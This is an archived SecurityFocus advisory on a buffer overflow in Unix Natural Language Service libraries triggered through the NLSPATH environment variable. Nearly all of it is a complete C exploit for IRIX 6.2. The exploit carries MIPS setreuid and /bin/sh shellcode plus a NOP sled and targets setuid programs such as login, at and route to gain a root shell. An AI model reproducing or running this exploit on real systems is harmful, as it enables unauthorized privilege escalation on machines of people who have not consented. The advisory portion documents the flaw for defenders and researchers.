Cray UNICOS 9.0/9.2/MAX 1.3/mk 1.5,AIX <= 4.2,Linux libc <= 5.2.18,RedHat 4.0,IRIX 6.2,Slackware 3.1 Natural Language Service (NLS) Vulnerability (1)   

source: http://www.securityfocus.com/bid/711/info

A buffer overflow condition affects libraries using the Natural Language Service (NLS). The NLS is the component of UNIX systems that provides facilities for customizing the natural language formatting for the system. Examples of the types of characteristics that can be set are language, monetary symbols and delimiters, numeric delimiters, and time formats.

Some libraries that use a particular environment variable associated with the NLS contain a vulnerability in which a buffer overflow condition can be triggered. The particular environment variable involved is NLSPATH on some systems and PATH_LOCALE on others.

It is possible to exploit this vulnerability to attain unauthorized access by supplying carefully crafted arguments to programs that are owned by a privileged user-id and that have setuid or setgid bits set. 

/*## copyright LAST STAGE OF DELIRIUM sep 1997 poland        *://lsd-pl.net/ #*/
/*## libc.so $NLSPATH                                                        #*/

#define NOPNUM 768
#define ADRNUM 176
#define TMPNUM 200

char setreuidcode[]=
    "\x30\x0b\xff\xff"    /* andi    $t3,$zero,0xffff     */
    "\x24\x02\x04\x01"    /* li      $v0,1024+1           */
    "\x20\x42\xff\xff"    /* addi    $v0,$v0,-1           */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "\x30\x44\xff\xff"    /* andi    $a0,$v0,0xffff       */
    "\x31\x65\xff\xff"    /* andi    $a1,$t3,0xffff       */
    "\x24\x02\x04\x64"    /* li      $v0,1124             */
    "\x03\xff\xff\xcc"    /* syscall                      */
;

char shellcode[]=
    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "/bin/sh"
;

char jump[]=
    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
    "\x03\xe0\x00\x08"    /* jr      $ra                  */
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[10000],adr[4],tmp[4],*b,*envp[2];
    int i,n=-1;

    printf("copyright LAST STAGE OF DELIRIUM sep 1997 poland  //lsd-pl.net/\n");
    printf("libc.so $NLSPATH for irix 6.2 IP:17,19,20,21,22\n\n");

    if(argc!=2){
        printf("usage: %s {login|who|netprint|ordist|cancel|route|"
            "at}\n",argv[0]);
        exit(-1);
    }
    if(!strcmp(argv[1],"login")) n=0;
    if(!strcmp(argv[1],"who")) n=1;
    if(!strcmp(argv[1],"netprint")) n=2;
    if(!strcmp(argv[1],"ordist")) n=3;
    if(!strcmp(argv[1],"cancel")) n=4;
    if(!strcmp(argv[1],"route")) n=5;
    if(!strcmp(argv[1],"at")) n=6;
    if(n==-1) exit(-1);

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+8492+1800;
    *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+8492-1024;

    envp[0]=buffer;
    envp[1]=0;

    b=buffer;
    sprintf(b,"NLSPATH=");
    b+=8;
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i]; 
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i]; 
    *b++=0xff;
    for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    switch(n){
    case 0: execle("/bin/login","lsd",0,envp);
    case 1: execle("/sbin/who","lsd",0,envp);
    case 2: execle("/usr/lib/print/netprint","lsd",0,envp);
    case 3: execle("/usr/bsd/ordist","lsd",0,envp);
    case 4: execle("/usr/bin/cancel","lsd",0,envp);
    case 5: execle("/usr/etc/route","lsd","add",0,envp);
    case 6: execle("/usr/bin/at","lsd","bzz",0,envp);
    }
}

